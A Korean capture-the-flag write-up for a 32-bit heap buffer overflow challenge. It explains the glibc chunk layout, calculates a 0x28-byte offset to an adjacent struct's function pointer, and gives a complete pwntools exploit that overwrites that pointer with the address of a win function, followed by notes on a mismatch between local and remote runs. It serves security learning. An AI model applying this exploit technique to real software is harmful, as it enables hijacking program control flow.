# Heap Overflow Writeup — 함수 포인터 덮어쓰기

## 1. 문제 개요

| 항목 | 값 |
|---|---|
| 아키텍처 | i386 (32-bit) |
| RELRO | No |
| Stack Canary | None |
| PIE | None |
| 취약점 | Heap Buffer Overflow |
| 최종 목표 | `over->table` 함수 포인터를 `win`으로 덮어 호출 유도 |

핵심 코드:

```c
char *ptr        = malloc(0x20);
struct over *over = malloc(0x20);

initialize();

over->table = table_func;   // 함수 포인터 초기화
scanf("%s", ptr);           // 길이 제한 없는 입력 → overflow
// ... 이후 over->table() 형태로 호출됨
```

`ptr`은 길이 검증 없이 `scanf("%s")`로 입력받고, 바로 뒤에 할당된 `over` 구조체 안에
함수 포인터 `table`이 존재한다. `ptr` 경계를 넘겨 쓰면 `over->table`을 덮을 수 있다.

---

## 2. Heap 구조 상세

### 2.1 malloc이 돌려주는 "청크(chunk)"

`malloc`은 요청한 크기만큼의 메모리만 주는 게 아니라, 관리용 **메타데이터(헤더)**가 앞에
붙은 **청크** 단위로 메모리를 관리한다. 사용자가 받는 포인터는 헤더 바로 다음(데이터 영역)을
가리킨다.

32비트 glibc 할당 청크(allocated chunk)의 구조:

```
         낮은 주소
        ┌──────────────────┐
 -0x08  │ prev_size (4B)    │  ← 이전 청크가 free면 그 크기, 아니면 이전 청크 데이터로 재사용
 -0x04  │ size      (4B)    │  ← 이 청크 전체 크기 + 하위 3비트 플래그(PREV_INUSE 등)
  0x00  │ 사용자 데이터 ... │  ← malloc이 반환하는 포인터(ptr)가 여기를 가리킴
        │                   │
        └──────────────────┘
         높은 주소
```

- 32비트는 헤더 필드가 각각 4바이트(`prev_size`, `size`).
- 정렬 단위는 8바이트(32비트), 최소 청크 크기도 그에 맞춰 결정된다.
- `size`의 하위 3비트는 크기가 아니라 플래그(`PREV_INUSE`, `IS_MMAPPED`, `NON_MAIN_ARENA`).

### 2.2 malloc(0x20)의 실제 청크 크기

요청 0x20바이트에 대해:

```
요청 크기            = 0x20
+ size 필드(4B)      = 0x24
8바이트 정렬 올림    → 0x28
```

따라서 **청크 전체 크기 = 0x28**, 사용자가 실제로 쓸 수 있는 영역은 0x24바이트 정도다.
(다음 청크의 `prev_size` 공간까지 빌려 쓸 수 있어 usable size가 요청보다 약간 크다.)

### 2.3 두 청크의 연속 배치

`ptr`과 `over`를 연달아 같은 크기로 할당하면, 할당자는 top chunk에서 순서대로 떼어내므로
**주소가 증가하는 방향으로 나란히** 놓인다. `ptr` 데이터 시작 주소를 `P`라 하면:

```
주소         내용                         소속
──────────────────────────────────────────────
P - 0x04   │ ptr 청크 size             │ ptr chunk 헤더
P + 0x00   │ ptr 사용자 데이터 시작     │ ← scanf 쓰기 시작점
  ...      │ (0x20 요청분)             │
P + 0x20   │ over 청크 prev_size       │ over chunk 헤더
P + 0x24   │ over 청크 size            │ over chunk 헤더
P + 0x28   │ over 사용자 데이터 시작    │ ← over->table (첫 필드)
──────────────────────────────────────────────
```

여기서 중요한 점:

1. `ptr`에서 높은 주소로 overflow하면 `over` 청크의 **헤더(prev_size, size)**를 먼저 지나
   `over`의 **사용자 데이터**에 도달한다.
2. `over`를 **free하지 않았기 때문에** 그 데이터 영역에는 할당자의 연결 리스트
   포인터(`fd`/`bk`)가 없고, 오직 **애플리케이션이 넣은 값(`table` 함수 포인터)**만 있다.
3. `over`를 free하지 않으니 헤더(`size` 등) 무결성 검사도 트리거되지 않는다.
   즉 헤더를 아무 값으로 덮어도 상관없고, 단지 포인터 자리까지 메우기만 하면 된다.

> 만약 `over`가 **해제된(free) 청크**였다면 상황이 다르다. 그때는 데이터 시작 위치에
> `fd`(tcache/fastbin의 next 포인터)가 놓이고, 공격 대상이 "할당자 메타데이터"로 바뀐다
> (tcache poisoning 등). 이 문제는 free가 없으므로 **순수하게 인접 객체의 함수 포인터를
> 덮는** 가장 단순한 heap overflow 시나리오다.

---

## 3. 오프셋 계산

`ptr` 데이터 시작(P) ~ `over->table`(P+0x28)까지의 거리:

```
ptr 사용자 영역(0x20)  → 0x20
over 청크 헤더(prev_size+size, 8B) → 0x08
──────────────────────────────
합계 offset = 0x28
```

`table`이 struct `over`의 첫 번째 멤버라는 가정에서 **offset = 0x28**.
첫 멤버가 아니라면 struct 내 `table`의 바이트 오프셋만큼 더한다.

### GDB로 실측하는 법

```gdb
b *main+<scanf 직전>
run
# ptr, over 주소 확인
p/x over - ptr          # → 0x28 이어야 함
p &((struct over*)over)->table   # table 필드 절대 주소
```

---

## 4. 페이로드 설계

```
[ 'A' * 0x28 ][ p32(win) ]
     패딩          덮을 값
```

- 패딩 0x28바이트: `ptr` 데이터부터 `over->table` 직전까지 채운다
  (그 사이의 `over` 청크 헤더도 같이 덮이지만 free 안 하므로 무해).
- `p32(win)`: 함수 포인터를 `win` 주소로 교체.

### 32비트에서의 null 바이트 이슈

- `win` 주소는 보통 `0x0804XXXX` → 상위 바이트가 `0x08`로 **null이 없다.**
  따라서 `p32(win)` 4바이트를 그대로 쓸 수 있다.
- `scanf("%s")`는 **공백 문자(0x20 space, 0x09 tab, 0x0a newline)에서 입력이 끊긴다.**
  win 주소 바이트에 이 값들이 없는지 확인해야 한다. 있으면 다른 진입점(`win+offset`,
  `ret` 한 칸 뒤 등)을 사용한다.

---

## 5. 최종 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF('./chall')   # 32-bit

def conn():
    return remote(HOST, PORT) if args.REMOTE else process(e.path)

p = conn()

win    = e.symbols['win']   # No PIE → 고정 주소
offset = 0x28               # ptr 데이터 시작 ~ over->table (GDB 실측 권장)

payload  = b'A' * offset
payload += p32(win)

p.sendline(payload)
p.interactive()
```

---

## 6. local 됨 / remote 안 됨 → 원인

익스플로잇 로직은 로컬·서버 동일했으나 서버에서만 실패했던 원인과 점검 포인트:

| 원인 | 설명 |
|---|---|
| 32비트 오프셋 오인 | 64비트 기준 0x30으로 계산하면 1청크 분량이 어긋나 `over->table`을 못 맞춤. 32비트는 **0x28** |
| 포인터 크기 | `p64` 대신 **`p32`** 사용 |
| flag 경로 | `win`이 여는 flag 파일 경로가 로컬과 서버에서 다를 수 있음(`./flag` vs `/flag`) |
| 입력 소비 | `scanf`가 여러 번이거나 뒤에 추가 입력을 기다리면 `interactive` 진입 전 prompt를 소비해야 함 |

이번 문제는 **아키텍처에 맞는 오프셋/포인터 크기 교정**으로 해결되었다.

---

## 7. 배운 점 (핵심 정리)

1. **Heap overflow의 정의**는 "인접 메모리를 넘쳐 쓰는 것"이지 특정 기법이 아니다.
   무엇을 덮느냐(사용자 데이터 vs 할당자 메타데이터)에 따라 결과가 갈린다.
2. **free 여부가 공격 대상을 바꾼다.**
   - 할당만 된 청크 → 인접 객체의 **함수 포인터/데이터** (이 문제)
   - 해제된 청크 → 할당자의 **`fd`(next) 포인터** → tcache/fastbin 계열
3. **오프셋은 요청 크기가 아니라 청크 크기 + 헤더로 계산**한다
   (32비트 malloc(0x20) → 청크 0x28 → 포인터까지 0x28).
4. **아키텍처(32/64bit)**는 헤더 크기, 정렬, 포인터 크기, null 바이트 처리 모두를 바꾼다.
   local/remote 불일치의 단골 원인.
5. 보호기법이 모두 꺼진(No PIE/No Canary/No RELRO) 환경에서는 **주소 고정 + leak 불필요**로
   가장 단순한 형태가 된다.
